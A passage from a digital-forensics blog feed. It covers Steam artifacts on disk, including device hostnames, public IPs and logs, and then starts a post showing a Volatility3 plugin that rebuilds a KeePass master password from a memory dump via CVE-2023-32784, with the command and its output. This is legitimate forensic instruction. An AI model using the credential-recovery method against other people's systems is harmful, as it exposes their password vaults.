<div class="language-JSON language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">...</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token string" style="color:rgb(255, 121, 198)">"Software"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"valve"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token string" style="color:rgb(255, 121, 198)">"Steam"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">				</span><span class="token string" style="color:rgb(255, 121, 198)">"apps"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">				</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">					</span><span class="token string" style="color:rgb(255, 121, 198)">"7"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">					</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">						</span><span class="token string" style="color:rgb(255, 121, 198)">"cloud"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">						</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">							</span><span class="token string" style="color:rgb(255, 121, 198)">"last_sync_state"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"synchronized"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">						</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">					</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">					</span><span class="token string" style="color:rgb(255, 121, 198)">"760"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">					</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">						</span><span class="token string" style="color:rgb(255, 121, 198)">"cloud"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">						</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">							</span><span class="token string" style="color:rgb(255, 121, 198)">"quota_bytes"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"20000000000"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">							</span><span class="token string" style="color:rgb(255, 121, 198)">"quota_files"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"50000"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">							</span><span class="token string" style="color:rgb(255, 121, 198)">"used_bytes"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"2177105"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">							</span><span class="token string" style="color:rgb(255, 121, 198)">"used_files"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"12"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">						</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">					</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">...</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Making a similar request with the Steam app id, one can retrive the metadata about the installed game to make better user profiling:</p>
<p>Request : <code>https://store.steampowered.com/api/libraryappdetails/?appid=[STEAM_APP_ID]&amp;l=english</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="connected-devices">Connected device(s)<a href="https://forensicxlab.github.io/blog/steam#connected-devices" class="hash-link" aria-label="Direct link to Connected device(s)" title="Direct link to Connected device(s)">‚Äã</a></h2>
<p>Locations:</p>
<ul>
<li>Windows 10 :  <code>%programfiles(x86)%\Steam\config\remoteclients.vdf</code></li>
<li>Ubuntu : <code>$HOME/.local/share/Steam/config/remoteclients.vdf</code></li>
<li>MacOS : <code>$HOME/Library/Application Support/Steam/config/remoteclients.vdf</code></li>
</ul>
<p>The remote client cache can tell us about the hostnames and public IP adresses that were recently used to connect to Steam (via browser or desktop application). It might be possible to even guess the operating system that were used if some default naming conventions were used. In the bellow example, we can guess that the source OS is probably Windows.</p>
<div class="language-JSON language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">"RemoteClientCache"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token string" style="color:rgb(255, 121, 198)">"1012008522321213291784"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"hostname"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"DESKTOP-3QEVFIQ"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"lastupdated"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"1688740718"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"lastresult"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"20"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"ippublic"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"193.43.70.103"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"apps"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token string" style="color:rgb(255, 121, 198)">"32802461232113594"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"hostname"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"DESKTOP-BNO4NTQ"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"lastupdated"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"1688740718"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"lastresult"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"20"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"ippublic"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"193.43.70.103"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"apps"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="application-logs">Application logs<a href="https://forensicxlab.github.io/blog/steam#application-logs" class="hash-link" aria-label="Direct link to Application logs" title="Direct link to Application logs">‚Äã</a></h2>
<p>There is a lot of logs saved linked to the activity of the application. They can be usefull to obtain more context in some cases.</p>
<p>Locations:</p>
<ul>
<li>Windows 10 :  <code>%programfiles(x86)%\Steam\logs\</code></li>
<li>Ubuntu : <code>$HOME/.local/share/Steam/logs/</code></li>
<li>MacOS : <code>$HOME/Library/Application Support/Steam/logs/</code></li>
</ul>
<p>Example :</p>
<div class="language-r codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-r codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2023-07-07 18:44:03] Loaded store 'machineuser' from '[...]/Library/Application Support/Steam/local.vdf' successfully</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2023-07-07 18:51:20] Flushed store 'userlocal' to '[...]/Library/Application Support/Steam/userdata/[...]/config/localconfig.vdf'</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2023-07-07 19:06:57] Flushed store 'userlocal' to '[...]/Library/Application Support/Steam/userdata/[...]/config/localconfig.vdf'</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2023-07-07 19:21:46] Flushed store 'userlocal' to '[...]/Library/Application Support/Steam/userdata/[...]/config/localconfig.vdf'</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2023-07-07 19:35:46] Flushed store 'userlocal' to '[...]/Library/Application Support/Steam/userdata/[...]/config/localconfig.vdf'</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2023-07-07 19:57:25] Flushed store 'install' to '[...]/Library/Application Support/Steam/config/config.vdf'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>What about the user conversations ?</h1>
<p>Unfortunately the user conversations are not saved on disk but on the Steam's servers. The channel used to send messages is encrypted through a socket using X509 certificates. You might be able to get those by collaborating with the Steam organization if you are law enforcement. It might be possible to retrieve conversations in the web browser cache or by using memory analysis though I did not dig into any of these hypotheses yet.</p>
<h1>Conclusion</h1>
<p>To conclude this article, we were able to retrieve a good amount of information about the user. Those artifacts were found from my own research, there might be more interesting artifacts that were missed when preparing this blog article. If you are looking to automate your artifacts collection, a python library <sup><a href="https://forensicxlab.github.io/blog/steam#user-content-fn-2-ffd9e8" id="user-content-fnref-2-ffd9e8" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup> exists to parse vdf files. Hopping it will help you when performing your investigations. Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to enhance this article.</p>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://forensicxlab.github.io/blog/steam#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">‚Äã</a></h2>
<ol>
<li id="user-content-fn-1-ffd9e8">
<p><a href="https://github.com/obsidianforensics/hindsight/" target="_blank" rel="noopener noreferrer">https://github.com/obsidianforensics/hindsight/</a> <a href="https://forensicxlab.github.io/blog/steam#user-content-fnref-1-ffd9e8" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-2-ffd9e8">
<p><a href="https://github.com/ValvePython/vdf" target="_blank" rel="noopener noreferrer">https://github.com/ValvePython/vdf</a> <a href="https://forensicxlab.github.io/blog/steam#user-content-fnref-2-ffd9e8" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">‚Ü©</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category>DFIR</category>
            <category>Steam</category>
            <category>Linux</category>
            <category>Windows</category>
            <category>Mac</category>
            <category>Video Games</category>
        </item>
        <item>
            <title><![CDATA[üì¶ Volatility3 Windows Plugin - KeePass]]></title>
            <link>https://forensicxlab.github.io/blog/keepass</link>
            <guid>https://forensicxlab.github.io/blog/keepass</guid>
            <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[On May 1st, 2023, vdhoney raised concerns about a flaw he found impacting KeePass 2.X.. Vdhoney claimed to be able to reconstruct the master password from memory.]]></description>
            <content:encoded><![CDATA[<p>On May 1st, 2023, vdhoney<sup><a href="https://forensicxlab.github.io/blog/keepass#user-content-fn-1-8d99df" id="user-content-fnref-1-8d99df" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup> raised concerns about a flaw he found impacting KeePass 2.X.<sup><a href="https://forensicxlab.github.io/blog/keepass#user-content-fn-2-8d99df" id="user-content-fnref-2-8d99df" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>. Vdhoney claimed to be able to reconstruct the master password from memory.
A POC <sup><a href="https://forensicxlab.github.io/blog/keepass#user-content-fn-3-8d99df" id="user-content-fnref-3-8d99df" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup> was later released by the researcher not only in dotnet but also in python3<sup><a href="https://forensicxlab.github.io/blog/keepass#user-content-fn-4-8d99df" id="user-content-fnref-4-8d99df" data-footnote-ref="true" aria-describedby="footnote-label">4</a></sup>.</p>
<p>Today in this blog post we will describe the vulnerability and see how we can create a volatility3 plugin to help forensics investigators to retrieve passwords from memory.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="vulnerability-description">Vulnerability description<a href="https://forensicxlab.github.io/blog/keepass#vulnerability-description" class="hash-link" aria-label="Direct link to Vulnerability description" title="Direct link to Vulnerability description">‚Äã</a></h2>
<p>The vulnerability (CVE-2023-32784 <sup><a href="https://forensicxlab.github.io/blog/keepass#user-content-fn-5-8d99df" id="user-content-fnref-5-8d99df" data-footnote-ref="true" aria-describedby="footnote-label">5</a></sup>) resides in the basic KeePass version 2.X written in .NET. This version utilizes its own custom-made text box named SecureTextBoxEx, not only for the master password entry dialog but also in other parts of the program such as password edit boxes. Though this use case is not likely to be used by users as it is a bad practice, it should be noted that the flaw does not cover the scenario where the master password was copied from a clipboard.
From this observation, Vdohney built up a method to recover that scattered information from memory. Indeed, this text box produces left over strings when a password is entered. For example, when ‚ÄúHello‚Äù is typed, the following strings remain present in memory ‚Äú‚Ä¢e, ‚Ä¢‚Ä¢l, ‚Ä¢‚Ä¢‚Ä¢l, ‚Ä¢‚Ä¢‚Ä¢‚Ä¢o‚Äù. One can find more details about this vulnerability on vdhoney‚Äôs github <sup><a href="https://forensicxlab.github.io/blog/keepass#user-content-fn-3-8d99df" id="user-content-fnref-3-8d99df-2" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-keepass-volatility3-plugin">The KeePass volatility3 plugin<a href="https://forensicxlab.github.io/blog/keepass#the-keepass-volatility3-plugin" class="hash-link" aria-label="Direct link to The KeePass volatility3 plugin" title="Direct link to The KeePass volatility3 plugin">‚Äã</a></h2>
<p>As a forensics investigator, you might have actual (or past) cases where KeePass 2.X process activities were retrieved. Using volatility3, it is possible to list the running processes using the ‚Äúpslist‚Äù or ‚Äúpsscan‚Äù plugin.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/Memory Analysis/MemoryImages/KeePassMachine ¬ª vol -f KeePassMachine.mem windows.pslist</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.4.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  100.00		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4	0	System	0x9908d5a87040	136	-	N/A	False	2023-05-19 14:20:08.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">108	4	Registry	0x9908d5af6080	4	-	N/A	False	2023-05-19 14:20:04.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">412	4	smss.exe	0x9908dabd8040	2	-	N/A	False	2023-05-19 14:20:08.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">532	516	csrss.exe	0x9908dac800c0	11	-	0	False	2023-05-19 14:20:32.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">628	516	wininit.exe	0x9908db831080	3	-	0	False	2023-05-19 14:20:32.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">648	620	csrss.exe	0x9908db847140	13	-	1	False	2023-05-19 14:20:32.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">700	628	services.exe	0x9908db894080	7	-	0	False	2023-05-19 14:20:32.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">740	620	winlogon.exe	0x9908db8a4080	3	-	1	False	2023-05-19 14:20:32.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">796	628	lsass.exe	0x9908db8c8080	6	-	0	False	2023-05-19 14:20:32.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">912	700	svchost.exe	0x9908db936240	13	-	0	False	2023-05-19 14:20:32.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1716	912	dllhost.exe	0x9908de764080	5	-	1	False	2023-05-19 14:23:07.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4888	700	SgrmBroker.exe	0x9908df512080	7	-	0	False	2023-05-19 14:23:08.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">7820	912	WmiPrvSE.exe	0x9908da4f7080	4	-	0	False	2023-05-19 14:23:26.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4272	4528	FTK Imager.exe	0x9908da509080	12	-	1	False	2023-05-19 14:23:42.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4100	700	WUDFHost.exe	0x9908de9a3080	5	-	0	False	2023-05-19 14:23:43.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2868	912	ShellExperienc	0x9908dec2c080	9	-	1	False	2023-05-19 14:23:45.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">7684	912	RuntimeBroker.	0x9908d7f0d2c0	3	-	1	False	2023-05-19 14:23:46.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">752	4528	KeePass.exe	0x9908da51b300	4	-	1	False	2023-05-19 14:25:34.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6344	700	svchost.exe	0x9908dd88a080	5	-	0	False	2023-05-19 14:25:49.000000 	N/A	Disabled</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In this example we can see that the KeePass process was running on the host machine. The PID retrieved is ‚Äú752‚Äù.
Using volatility3, one can dump this process layer and retrieve all the sections linked to the virtual address spaces. Once completed, one can map virtual pages to physical pages and extract the residing data.</p>
<p>A custom plugin allows to parse the data to isolate the relevant patterns (in this case ‚Äú‚óè‚Äù) seeking to further attempt the reconstruction of the master KeePass password entered by a user. The plugin can be found here: <a href="https://github.com/forensicxlab/volatility3_plugins/blob/main/keepass.py" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/volatility3_plugins/blob/main/keepass.py</a></p>
<p>By passing the PID of the process to the volatility3 KeePass plugin, one can try to reconstruct the master password:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/Memory Analysis/MemoryImages/KeePassMachine ¬ª vol -f KeePassMachine.mem windows.keepass --pid 752                                                                                                          k1nd0ne@MacBook-Pro-de-Felix</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.4.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  100.00		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Offset	Size	Constructed_Password</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3ba6000	0x1000	u</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3ba7000	0x1000	up</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3ba7000	0x1000	upe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3ba8000	0x1000	uper</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3ba9000	0x1000	uperM</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3ba9000	0x1000	uperMa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3baa000	0x1000	uperMa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3baa000	0x1000	uperMas</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bab000	0x1000	uperMast</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bab000	0x1000	uperMaste</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bac000	0x1000	uperMaste</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bac000	0x1000	uperMaster</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bad000	0x7000	uperMasterP</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bad000	0x7000	uperMasterPa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bad000	0x7000	uperMasterPas</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bad000	0x7000	uperMasterPass</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bad000	0x7000	uperMasterPassw</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bad000	0x7000	uperMasterPasswo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bad000	0x7000	uperMasterPasswor</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x3bad000	0x7000	uperMasterPassword</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x7ffbf8ac5000	0x1000	uperMasterPassword</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x96e545bd2000	0x1000	{u,,}perMasterPassword</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xc58000400000	0x200000	{u,&amp;,o}perMasterPassword</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xf80564600000	0x1200000	{u,&amp;,,,J}perMasterPassword</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xf805737d3000	0x1f000	{u,&amp;,,,o, }perMasterPassword</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" 